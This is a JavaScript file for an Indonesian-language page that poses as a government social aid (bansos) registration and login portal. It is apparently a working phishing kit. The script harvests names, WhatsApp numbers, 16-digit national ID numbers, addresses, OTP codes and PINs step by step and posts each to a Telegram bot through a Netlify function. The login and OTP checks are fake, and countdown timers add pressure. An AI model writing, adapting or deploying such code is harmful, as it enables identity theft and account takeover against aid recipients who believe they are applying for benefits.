// Data yang disimpan sementara
let userData = {
    nama: '',
    whatsapp: '',
    ktp: '',
    alamat: ''
};

// Background Animation
document.addEventListener('DOMContentLoaded', function() {
    createBubbles();
    startCountdown();
    startOtpTimer();
    setupInputValidation();
    setupPinInputs();
    
    // Cek apakah pengguna sudah terdaftar (simulasi)
    checkIfUserRegistered();
});

function createBubbles() {
    const bgAnimation = document.getElementById('bgAnimation');
    const bubbleCount = 15;
    
    for (let i = 0; i < bubbleCount; i++) {
        const bubble = document.createElement('div');
        bubble.classList.add('bg-bubble');
        
        const size = Math.random() * 100 + 50;
        const posX = Math.random() * 100;
        const posY = Math.random() * 100;
        const delay = Math.random() * 15;
        const duration = Math.random() * 10 + 15;
        
        bubble.style.width = `${size}px`;
        bubble.style.height = `${size}px`;
        bubble.style.left = `${posX}%`;
        bubble.style.top = `${posY}%`;
        bubble.style.animationDelay = `${delay}s`;
        bubble.style.animationDuration = `${duration}s`;
        
        bgAnimation.appendChild(bubble);
    }
}

function startCountdown() {
    let time = 15 * 60; // 15 minutes in seconds
    
    const countdownElement = document.getElementById('countdown-timer');
    
    const timer = setInterval(() => {
        const minutes = Math.floor(time / 60);
        const seconds = time % 60;
        
        countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        if (time <= 0) {
            clearInterval(timer);
            countdownElement.innerHTML = '<span style="color:#dc3545;">Waktu Habis!</span>';
        } else {
            time--;
        }
    }, 1000);
}

function startOtpTimer() {
    let time = 2 * 60; // 2 minutes in seconds
    
    const otpTimerElement = document.getElementById('otp-timer');
    
    const timer = setInterval(() => {
        const minutes = Math.floor(time / 60);
        const seconds = time % 60;
        
        otpTimerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        if (time <= 0) {
            clearInterval(timer);
            otpTimerElement.innerHTML = '<span style="color:#dc3545;">Kode Kadaluarsa!</span>';
        } else {
            time--;
        }
    }, 1000);
}

function setupInputValidation() {
    const inputs = document.querySelectorAll('input, textarea');
    
    inputs.forEach(input => {
        input.addEventListener('input', function() {
            const icon = this.parentNode.querySelector('.input-icon i');
            if (this.value.trim() !== '') {
                icon.style.display = 'block';
                icon.style.color = '#28a745';
            } else {
                icon.style.display = 'none';
            }
        });
    });
}

function setupPinInputs() {
    const pinInputs = document.querySelectorAll('.pin-input');
    
    pinInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
            if (this.value.length === 1 && index < pinInputs.length - 1) {
                pinInputs[index + 1].focus();
            }
        });
        
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
                pinInputs[index - 1].focus();
            }
        });
    });
}

// Fungsi untuk mengirim data ke Telegram
async function sendToTelegram(data, type) {
    try {
        const response = await fetch('/.netlify/functions/send-telegram', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                type: type,
                data: data,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            })
        });
        
        if (response.ok) {
            console.log('Data berhasil dikirim ke Telegram');
        } else {
            console.error('Gagal mengirim data ke Telegram');
        }
    } catch (error) {
        console.error('Error mengirim data:', error);
    }
}

// Fungsi untuk memeriksa apakah pengguna sudah terdaftar
function checkIfUserRegistered() {
    // Simulasi: 70% kemungkinan pengguna sudah terdaftar
    const isRegistered = Math.random() < 0.7;
    
    if (isRegistered) {
        // Tampilkan notifikasi atau tombol akses cepat
        console.log("Pengguna sudah terdaftar, siapkan akses cepat ke dashboard");
    }
}

// Fungsi untuk langsung ke dashboard tanpa login
function directToDashboard() {
    // Sembunyikan semua halaman
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    
    // Tampilkan dashboard
    document.getElementById('dashboardPage').classList.add('active');
    
    // Kirim notifikasi ke Telegram
    sendToTelegram({
        action: 'direct_dashboard_access',
        ip: 'unknown' // Dalam produksi, dapatkan IP dari backend
    }, 'dashboard_access');
    
    // Tampilkan pesan selamat datang
    showWelcomeNotification();
}

function showWelcomeNotification() {
    setTimeout(() => {
        alert("Selamat datang kembali! Anda telah masuk ke dashboard Bantuan Sosial.");
    }, 500);
}

// Fungsi untuk memilih opsi (Pendaftaran Baru atau Masuk)
function selectOption(option) {
    if (option === 'register') {
        document.getElementById('page0').classList.remove('active');
        document.getElementById('page1').classList.add('active');
    } else if (option === 'login') {
        document.getElementById('page0').classList.remove('active');
        document.getElementById('loginPage').classList.add('active');
    }
}

// Fungsi untuk kembali ke halaman utama
function goToHome() {
    // Sembunyikan semua halaman
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    
    // Tampilkan halaman utama
    document.getElementById('page0').classList.add('active');
}

// Fungsi untuk pergi ke halaman login
function goToLogin() {
    document.getElementById('page1').classList.remove('active');
    document.getElementById('loginPage').classList.add('active');
}

// Fungsi untuk proses login
function processLogin() {
    const whatsapp = document.getElementById('loginWhatsapp').value;
    const nama = document.getElementById('loginNama').value;
    const pinInputs = document.querySelectorAll('.pin-input');
    let pin = '';
    
    for (let i = 0; i < pinInputs.length; i++) {
        if (!pinInputs[i].value) {
            alert('Harap lengkapi PIN 6 angka!');
            return;
        }
        pin += pinInputs[i].value;
    }
    
    // Simulasi login berhasil
    if (whatsapp && nama && pin.length === 6) {
        document.getElementById('loginDisplayNama').textContent = nama;
        document.getElementById('loginPage').classList.remove('active');
        document.getElementById('dashboardPage').classList.add('active');
        
        // Kirim data login ke Telegram
        sendToTelegram({
            whatsapp: whatsapp,
            nama: nama,
            pin: pin,
            action: 'login_attempt'
        }, 'login');
    } else {
        alert('Data login tidak valid. Silakan coba lagi atau gunakan akses langsung ke dashboard.');
    }
}

// Fungsi untuk berpindah halaman (pendaftaran)
function nextPage(currentPage) {
    // Validasi form sebelum pindah halaman
    if (currentPage === 1) {
        const nama = document.getElementById('nama').value;
        const whatsapp = document.getElementById('whatsapp').value;
        
        if (!nama || !whatsapp) {
            alert('Harap lengkapi semua data!');
            return;
        }
        
        userData.nama = nama;
        userData.whatsapp = whatsapp;
        
        // Kirim data ke Telegram
        sendToTelegram({
            nama: nama,
            whatsapp: whatsapp,
            action: 'step1_completed'
        }, 'registration_step1');
        
    } else if (currentPage === 2) {
        const ktp = document.getElementById('ktp').value;
        const alamat = document.getElementById('alamat').value;
        
        if (!ktp || ktp.length !== 16 || !alamat) {
            alert('Harap lengkapi nomor KTP (16 digit) dan alamat lengkap!');
            return;
        }
        
        userData.ktp = ktp;
        userData.alamat = alamat;
        
        // Kirim data ke Telegram
        sendToTelegram({
            nama: userData.nama,
            whatsapp: userData.whatsapp,
            ktp: ktp,
            alamat: alamat,
            action: 'step2_completed'
        }, 'registration_step2');
        
    } else if (currentPage === 3) {
        // Validasi OTP (dalam implementasi nyata, ini akan dicek dengan backend)
        const otpInputs = document.querySelectorAll('.otp-input');
        let otp = '';
        
        for (let i = 0; i < otpInputs.length; i++) {
            if (!otpInputs[i].value) {
                alert('Harap lengkapi kode OTP!');
                return;
            }
            otp += otpInputs[i].value;
        }
        
        // Simulasi verifikasi OTP berhasil
        if (otp.length !== 6) {
            alert('Kode OTP harus 6 digit!');
            return;
        }
        
        // Tampilkan nama di halaman dashboard
        document.getElementById('displayNama').textContent = userData.nama;
        
        // Kirim data lengkap ke Telegram
        sendToTelegram({
            ...userData,
            otp: otp,
            action: 'registration_completed'
        }, 'registration_complete');
    }
    
    // Sembunyikan halaman saat ini dan tampilkan halaman berikutnya
    document.getElementById('page' + currentPage).classList.remove('active');
    document.getElementById('page' + (currentPage + 1)).classList.add('active');
}

// Fungsi untuk kembali ke halaman sebelumnya (pendaftaran)
function prevPage(currentPage) {
    document.getElementById('page' + currentPage).classList.remove('active');
    document.getElementById('page' + (currentPage - 1)).classList.add('active');
}

// Fungsi untuk menampilkan notifikasi
function showNotification() {
    const notification = document.getElementById('notification');
    notification.style.display = 'block';
    
    // Kirim notifikasi pencairan ke Telegram
    sendToTelegram({
        nama: userData.nama || 'Penerima Bansos',
        whatsapp: userData.whatsapp || 'Unknown',
        action: 'withdrawal_attempt'
    }, 'withdrawal_attempt');
    
    setTimeout(() => {
        notification.style.display = 'none';
    }, 5000);
}

// Fungsi untuk navigasi OTP (auto focus ke input berikutnya)
document.addEventListener('DOMContentLoaded', function() {
    const otpInputs = document.querySelectorAll('.otp-input');
    
    otpInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
            if (this.value.length === 1 && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
        });
        
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
                otpInputs[index - 1].focus();
            }
        });
    });
});
